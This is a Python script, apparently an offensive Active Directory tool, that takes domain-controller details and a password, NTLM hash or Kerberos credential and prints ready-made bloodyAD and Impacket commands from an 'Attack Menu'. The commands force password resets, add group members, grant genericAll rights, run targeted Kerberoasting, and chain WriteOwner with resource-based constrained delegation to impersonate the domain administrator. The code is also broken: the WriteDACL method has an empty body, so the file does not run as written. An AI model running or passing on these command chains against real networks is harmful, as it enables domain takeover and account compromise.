import signal
import sys

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


class AuthBase:
    def auth(self):
        raise NotImplementedError
    
class PasswordAuth(AuthBase):
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def auth(self):
        print("Using password for authentication...")
class NTLMAuth(AuthBase):
    def __init__(self, username, ntlmhash):
        self.username = username
        self.ntlmhash = ntlmhash
    
    def auth(self):
        print("Using ntlm hash for authentication....")
class KerberosAuth(AuthBase):
    def __init__(self, username):
        self.username = username
        
    def auth(self):
        print("Using kerberos for authentication")

def auth_type(username):
    print("Authentication types...")
    print("1 for password authentication")
    print("2 for ntlm authentication")
    print("3 for kerberos authentication")


    choice = input("Select: ").strip()

    if choice == "1":
        password = input("password: ")
        return PasswordAuth(username, password)
    elif choice == "2":
        ntlmhash = input("NTLM hash: ")
        return NTLMAuth(username, ntlmhash)
    elif choice == "3":
        return KerberosAuth(username)
    
    else:
        print("Invalid option")
        return None
    

class ConnectionContext:
    def __init__(self, dc_fqdn, domain, dc_ip=None):
        self.dc_fqdn = dc_fqdn
        self.domain = domain
        self.dc_ip = dc_ip
        self.auth = None


class ForceChangePassword:
    def __init__(self, ctx):
        self.ctx = ctx

    def execute(self):
        target = input("Target username: ")
        newpass = input("New password: ")

        if isinstance(self.ctx.auth, PasswordAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password}  set password '{target}' '{newpass}'"
        elif isinstance(self.ctx.auth, NTLMAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash}  set password '{target}' '{newpass}'"
        elif isinstance(self.ctx.auth, KerberosAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k  set password '{target}' '{newpass}'"

        print(f"\n[+] Command:\n{cmd}\n")
class AddUserToGroup:
    def __init__(self, ctx):
        self.ctx = ctx
    def execute(self):
        target = input("Target Username: ")
        group_name = input("Group Name: ")

        if isinstance(self.ctx.auth, PasswordAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} add groupMember '{group_name}' '{target}'"
        elif isinstance(self.ctx.auth, NTLMAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} add groupMember '{group_name}' '{target}'"
        elif isinstance(self.ctx.auth, KerberosAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k add groupMember '{group_name}' '{target}'"
        print(f"\n[+] Command:\n{cmd}\n")
class GenericAll:
    def __init__(self, ctx):
        self.ctx = ctx
    def execute(self):
        target = input("Target Username: ")
        group_name = input("Group Name: ")

        if isinstance(self.ctx.auth, PasswordAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} add genericAll '{group_name}' '{target}'"
        elif isinstance(self.ctx.auth, NTLMAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} add genericAll '{group_name}' '{target}'"
        elif isinstance(self.ctx.auth, KerberosAuth):
            cmd = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k add genericAll '{group_name}' '{target}'"
        print(f"\n[+] Command:\n{cmd}\n")

class targetedKerberoast:
    def __init__(self, ctx):
        self.ctx = ctx
    def execute(self):
        
        if isinstance(self.ctx.auth, PasswordAuth):
            cmd = f"python3 targetedKerberoast.py -v -d '{self.ctx.domain}' -u '{self.ctx.auth.username}' -p '{self.ctx.auth.password}'"
        elif isinstance(self.ctx.auth, NTLMAuth):
            cmd = f"python3 targetedKerberoast.py -v -d '{self.ctx.domain}' -u '{self.ctx.auth.username}' -H '{self.ctx.auth.ntlmhash}'"
        elif isinstance(self.ctx.auth, KerberosAuth):
            cmd = f"python3 targetedKerberoast.py -v -d '{self.ctx.domain}' -u '{self.ctx.auth.username}' -k --no-pass"
        print(f"\n[+] Command:\n{cmd}\n")
class WriteOwner:
    def __init__(self, ctx):
        self.ctx = ctx

    def execute(self):
        print("\nChoose WriteOwner option:")
        print("1. WriteOwner on User")
        print("2. WriteOwner on Computer")
        print("3. WriteOwner on Group")

        choice = input("Enter your choice (1, 2, 3): ").strip()

        if choice == "1":
            target = input("Target username: ")
            newpass = input("New password: ")
        
            if isinstance(self.ctx.auth, PasswordAuth):
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} set owner '{target}' '{self.ctx.auth.username}'"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} add genericAll '{target}' '{self.ctx.auth.username}'"
                cmd3 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} set password '{target}' '{newpass}'"
            elif isinstance(self.ctx.auth, NTLMAuth):
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} set owner '{target}' '{self.ctx.auth.username}'"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} add genericAll '{target}' '{self.ctx.auth.username}'"
                cmd3 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} set password '{target}' '{newpass}'"
            elif isinstance(self.ctx.auth, KerberosAuth):
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k set owner '{target}' '{self.ctx.auth.username}'"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k add genericAll '{target}' '{self.ctx.auth.username}'"
                cmd3 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k set password '{target}' '{newpass}'"
            
            print(f"\n[+] Generated Commands:\n")
            print(cmd1)
            print(cmd2)
            print(cmd3)
            print()
                
        elif choice == "2":
            target = input("Target Computer: ")
            attacker_comp = input("Attacker computer name (default: ATTACKERSYSTEM): ").strip() or "ATTACKERSYSTEM"
            attacker_pass = input("Attacker computer password (default: Summer2020!): ").strip() or "Summer2020!"
            impersonate_user = input("User to impersonate (default: administrator): ").strip() or "administrator"
            
            if isinstance(self.ctx.auth, PasswordAuth):
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} set owner {target}$ {self.ctx.auth.username}"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} add genericAll {target}$ {self.ctx.auth.username}"
                cmd3 = f"addcomputer.py -method LDAPS -computer-name '{attacker_comp}$' -computer-pass '{attacker_pass}' -dc-host {self.ctx.dc_fqdn} -domain-netbios {self.ctx.domain} '{self.ctx.domain}/{self.ctx.auth.username}:{self.ctx.auth.password}'"
                cmd4 = f"rbcd.py -delegate-from '{attacker_comp}$' -delegate-to '{target}$' -action 'write' '{self.ctx.domain}/{self.ctx.auth.username}:{self.ctx.auth.password}'"
                cmd5 = f"getST.py -spn 'cifs/{target}.{self.ctx.domain}' -impersonate '{impersonate_user}' '{self.ctx.domain}/{attacker_comp.lower()}$:{attacker_pass}'"
            
            elif isinstance(self.ctx.auth, NTLMAuth):
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} set owner {target}$ {self.ctx.auth.username}"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} add genericAll {target}$ {self.ctx.auth.username}"
                cmd3 = f"addcomputer.py -method LDAPS -computer-name '{attacker_comp}$' -computer-pass '{attacker_pass}' -dc-host {self.ctx.dc_fqdn} -domain-netbios {self.ctx.domain} '{self.ctx.domain}/{self.ctx.auth.username}' -hashes :{self.ctx.auth.ntlmhash}"
                cmd4 = f"rbcd.py -delegate-from '{attacker_comp}$' -delegate-to '{target}$' -action 'write' '{self.ctx.domain}/{self.ctx.auth.username}' -hashes :{self.ctx.auth.ntlmhash}"
                cmd5 = f"getST.py -spn 'cifs/{target}.{self.ctx.domain}' -impersonate '{impersonate_user}' '{self.ctx.domain}/{attacker_comp.lower()}$:{attacker_pass}'"
            
            elif isinstance(self.ctx.auth, KerberosAuth):
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k set owner {target}$ {self.ctx.auth.username}"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k add genericAll {target}$ {self.ctx.auth.username}"
                cmd3 = f"addcomputer.py -method LDAPS -computer-name '{attacker_comp}$' -computer-pass '{attacker_pass}' -dc-host {self.ctx.dc_fqdn} -domain-netbios {self.ctx.domain} '{self.ctx.domain}/{self.ctx.auth.username}' -k --no-pass"
                cmd4 = f"rbcd.py -delegate-from '{attacker_comp}$' -delegate-to '{target}$' -action 'write' '{self.ctx.domain}/{self.ctx.auth.username}' -k --no-pass"
                cmd5 = f"getST.py -spn 'cifs/{target}.{self.ctx.domain}' -impersonate '{impersonate_user}' '{self.ctx.domain}/{attacker_comp.lower()}$:{attacker_pass}'"
            
            print(f"\n[+] Generated Commands:\n")
            print(cmd1)
            print(cmd2)
            print(cmd3)
            print(cmd4)
            print(cmd5)
            print()
        elif choice == "3":
            target = input("Target group: ")

            if isinstance(self.ctx.auth, PasswordAuth):     
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} set owner '{target}' {self.ctx.auth.username}"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} add genericAll '{target}' {self.ctx.auth.username}"
                cmd3 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p {self.ctx.auth.password} add groupMember '{target}' {self.ctx.auth.username}"
            elif isinstance(self.ctx.auth, NTLMAuth):     
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} set owner '{target}' {self.ctx.auth.username}"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} add genericAll '{target}' {self.ctx.auth.username}"
                cmd3 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -p :{self.ctx.auth.ntlmhash} add groupMember '{target}' {self.ctx.auth.username}"
            elif isinstance(self.ctx.auth, KerberosAuth):     
                cmd1 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k  set owner '{target}' {self.ctx.auth.username}"
                cmd2 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k  add genericAll '{target}' {self.ctx.auth.username}"
                cmd3 = f"bloodyAD --host {self.ctx.dc_fqdn} -d {self.ctx.domain} -u {self.ctx.auth.username} -k  add groupMember '{target}' {self.ctx.auth.username}"
            
            print(f"\n[+] Generated Commands:\n")
            print(cmd1)
            print(cmd2)
            print(cmd3)
            print()

        else:
            print("Invalid Choice")
            return

class WriteDACL:
    def __init__(self, ctx):
        self.ctx = ctx
        
    def execute(self):
        


def get_auth():
    username = input("Enter a username: ")
    auth = auth_type(username)
    if auth:
        auth.auth()
    return auth

def show_menu():
    print("=== Menu ===")
    print("update - Update Credentials")
    print("show - Show current configuration")
    print("exit - Exit program")

    print("=== Attack Menu ===")
    print("1. ForceChangePassword")
    print("2. AddUserToGroup")
    print("3. Give User to GenericAll rights")
    print("4. targetedKerberoast")
    print("5. WriteOwner")



def main():
    print("=== Target Information===")
    dc_fqdn = input("Ente a dc_fqdn: ")
    domain = input("Enter a domain: ")
    dc_ip = input("Enter dc_ip: ")

    ctx = ConnectionContext(dc_fqdn, domain, dc_ip)
    print(f"Connected to {domain} ({dc_fqdn})\n")
    while True:
        auth = get_auth()
        if not auth:
            print("Autentication failed try again")
            continue
        ctx.auth = auth
        while True:
            try:
                cmd = input("alemadar> ").strip()
                if not cmd:
                    continue

                if cmd == "update":
                    print("Updating credentials...")
                    break
                elif cmd in ("exit", "quit"):
                    print("goodbye")
                    return
                else:
                    if cmd == "1":
                        attack = ForceChangePassword(ctx)
                        attack.execute()
                    elif cmd == "2":
                        attack = AddUserToGroup(ctx)
                        attack.execute()
                    elif cmd == "3":
                        attack = GenericAll(ctx)
                        attack.execute
                    elif cmd == "4":
                        attack = targetedKerberoast(ctx)
                        attack.execute()
                    elif cmd == "5":
                        attack = WriteOwner(ctx)
                        attack.execute()
                
                    elif cmd == "menu":
                        show_menu()
                    elif cmd == "show":
                        print("\n=== Current Information ===")
                        print(f"Domain: {ctx.domain}")
                        print(f"DC: {ctx.dc_fqdn}")
                        print(f"DC IP: {ctx.dc_ip}")
                        print(f"Username: {ctx.auth.username}")
                        if isinstance(ctx.auth, PasswordAuth):
                            print(f"Auth Type: Password")
                        elif isinstance(ctx.auth, NTLMAuth):
                            print(f"Auth Type: NTLM")
                        elif isinstance(ctx.auth, KerberosAuth):
                            print(f"Auth Type: Kerberos")

                    else:
                        print(f"Unkown command: {cmd}")
            except EOFError:
                print("\n[!] Exiting...")
                return
if __name__ == "__main__":
    main()